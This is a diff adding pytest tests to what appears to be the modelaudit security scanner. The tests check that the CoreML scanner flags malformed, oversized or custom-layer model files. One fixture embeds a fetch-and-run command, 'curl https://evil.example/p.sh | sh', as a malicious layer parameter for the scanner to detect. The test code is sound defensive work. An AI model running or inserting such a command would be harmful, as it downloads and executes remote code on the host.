@@ -5,10 +5,15 @@ from pathlib import Path
 
 import pytest
 
-from modelaudit.core import determine_exit_code, scan_model_directory_or_file
-from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, IssueSeverity
+from modelaudit.core import determine_exit_code, scan_file, scan_model_directory_or_file
+from modelaudit.scanner_results import INCONCLUSIVE_SCAN_OUTCOME
+from modelaudit.scanners.base import FORMAT_VALIDATION_CONFIG_KEY, CheckStatus, IssueSeverity
 from modelaudit.scanners.coreml_scanner import CoreMLScanner
-from modelaudit.utils.file.detection import detect_file_format, detect_format_from_extension
+from modelaudit.utils.file.detection import (
+    PROTOBUF_MODEL_CANDIDATE_FORMAT,
+    detect_file_format,
+    detect_format_from_extension,
+)
 
 
 def _encode_varint(value: int) -> bytes:
@@ -128,6 +133,38 @@ def test_coreml_scanner_can_handle_strict_detection(tmp_path: Path) -> None:
     assert CoreMLScanner.can_handle(str(renamed_text)) is False
 
 
+def test_coreml_scanner_rejects_empty_model_type_payload(tmp_path: Path) -> None:
+    model_path = _write_model(
+        tmp_path / "empty_model_type.mlmodel",
+        _field_varint(1, 8) + _field_bytes(2, _build_description(metadata=_build_metadata())) + _field_bytes(500, b""),
+    )
+
+    result = CoreMLScanner().scan(str(model_path))
+
+    assert result.success is False
+    assert any(check.name == "CoreML Structural Validation" for check in result.checks)
+
+
+def test_coreml_tentative_candidate_field_limit_remains_inconclusive(tmp_path: Path) -> None:
+    model_path = _write_model(
+        tmp_path / "field_budget_candidate.jpg",
+        (b"\x9a\x06\x00" * (CoreMLScanner.MAX_TOP_LEVEL_FIELDS + 1))
+        + _build_model(
+            description=_build_description(metadata=_build_metadata()),
+            neural_network=_build_neural_network(layers=[_build_layer("dense_1")]),
+        ),
+    )
+
+    result = CoreMLScanner(
+        config={FORMAT_VALIDATION_CONFIG_KEY: {"routed_format": PROTOBUF_MODEL_CANDIDATE_FORMAT}}
+    ).scan(str(model_path))
+
+    assert result.scanner_name == "unknown"
+    assert result.success is False
+    assert result.metadata["scan_outcome"] == "inconclusive"
+    assert "coreml_top_level_field_limit" in result.metadata["scan_outcome_reasons"]
+
+
 def test_coreml_scanner_benign_model(tmp_path: Path) -> None:
     safe_model_path = _write_model(
         tmp_path / "safe.mlmodel",
@@ -199,7 +236,11 @@ def test_coreml_unavailable_read_is_inconclusive_not_security_finding(
     aggregate = scan_model_directory_or_file(str(model_path), cache_scan_results=False)
 
     read_checks = [check for check in direct.checks if check.name == "CoreML File Read"]
+    assert direct.success is False
+    assert aggregate.success is False
     assert len(read_checks) == 1
+    assert read_checks[0].status == CheckStatus.FAILED
+    assert "Failed to read CoreML file" in read_checks[0].message
     assert read_checks[0].severity == IssueSeverity.INFO
     assert read_checks[0].details["analysis_incomplete"] is True
     assert read_checks[0].details["scan_outcome_reason"] == "coreml_read_failed"
@@ -209,6 +250,9 @@ def test_coreml_unavailable_read_is_inconclusive_not_security_finding(
     metadata = aggregate.file_metadata[str(model_path)]
     assert "coreml_read_failed" in metadata["scan_outcome_reasons"]
     assert metadata["operational_error_reason"] == "coreml_read_failed"
+    assert any(
+        check.name == "CoreML File Read" and "Failed to read CoreML file" in check.message for check in aggregate.checks
+    )
     assert not [
         issue for issue in aggregate.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
     ]
@@ -313,6 +357,64 @@ def test_coreml_scanner_detects_custom_layer_and_parameter_payload(tmp_path: Pat
     assert any("Custom CoreML layer detected" in issue.message for issue in critical_issues)
     assert any("custom_1" in issue.details.get("layer_name", "") for issue in critical_issues)
     assert any("field_path" in issue.details for issue in critical_issues)
+
+
+def test_coreml_scanner_detects_custom_layer_after_unknown_group_prefix(tmp_path: Path) -> None:
+    malicious_model = _write_model(
+        tmp_path / "group_prefixed_custom_layer.mlmodel",
+        b"\x9b\x06\x08\x01\x9c\x06"
+        + _build_model(
+            description=_build_description(metadata=_build_metadata()),
+            neural_network=_build_neural_network(
+                layers=[
+                    _build_layer(
+                        "custom_1",
+                        custom_class="EvilRuntimeLayer",
+                        custom_params={"postprocess_script": "bash -c 'curl https://evil.example/p.sh | sh'"},
+                    )
+                ]
+            ),
+        ),
+    )
+
+    assert CoreMLScanner.can_handle(str(malicious_model)) is True
+
+    result = CoreMLScanner().scan(str(malicious_model))
+
+    assert result.success is False
+    assert any(
+        issue.severity == IssueSeverity.CRITICAL and "Custom CoreML layer detected" in issue.message
+        for issue in result.issues
+    )
+
+
+def test_coreml_scanner_unknown_group_prefix_respects_field_limit(tmp_path: Path) -> None:
+    oversized_group = (
+        _encode_varint((99 << 3) | 3)
+        + (_field_varint(100, 1) * CoreMLScanner.MAX_TOP_LEVEL_FIELDS)
+        + _encode_varint((99 << 3) | 4)
+    )
+    model_path = _write_model(
+        tmp_path / "oversized_group_prefix.mlmodel",
+        oversized_group
+        + _build_model(
+            description=_build_description(metadata=_build_metadata()),
+            neural_network=_build_neural_network(layers=[_build_layer("safe")]),
+        ),
+    )
+
+    assert CoreMLScanner.can_handle(str(model_path)) is False
+
+    result = CoreMLScanner().scan(str(model_path))
+
+    assert result.success is False
+    assert result.metadata["scan_outcome"] == "inconclusive"
+    assert "coreml_top_level_field_limit" in result.metadata["scan_outcome_reasons"]
+    assert any(
+        check.name == "CoreML Protobuf Parse"
+        and check.details.get("parse_error") == f"field count exceeded limit ({CoreMLScanner.MAX_TOP_LEVEL_FIELDS})"
+        for check in result.checks
+    )
 
 
 def test_coreml_scanner_detects_metadata_command_and_network_patterns(tmp_path: Path) -> None:
@@ -575,6 +677,26 @@ def test_coreml_scanner_detects_custom_model_nested_in_pipeline_models(tmp_path:
         and "CoreML custom model class detected" in issue.message
         and issue.details.get("class_name") == "NestedPipelineRuntime"
         and "][1:0][555].className" in issue.details.get("field_path", "")
+        for issue in result.issues
+    )
+
+
+def test_coreml_routing_is_not_stolen_by_tensorflow_content_probe(tmp_path: Path) -> None:
+    model_path = _write_model(
+        tmp_path / "custom_model.mlmodel",
+        _build_model(
+            description=_build_description(metadata=_build_metadata()),
+            custom_model_class="EvilRuntimeModel",
+        ),
+    )
+
+    result = scan_file(str(model_path), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "coreml"
+    assert any(
+        issue.severity == IssueSeverity.CRITICAL
+        and "CoreML custom model class detected" in issue.message
+        and issue.details.get("class_name") == "EvilRuntimeModel"
         for issue in result.issues
     )
 
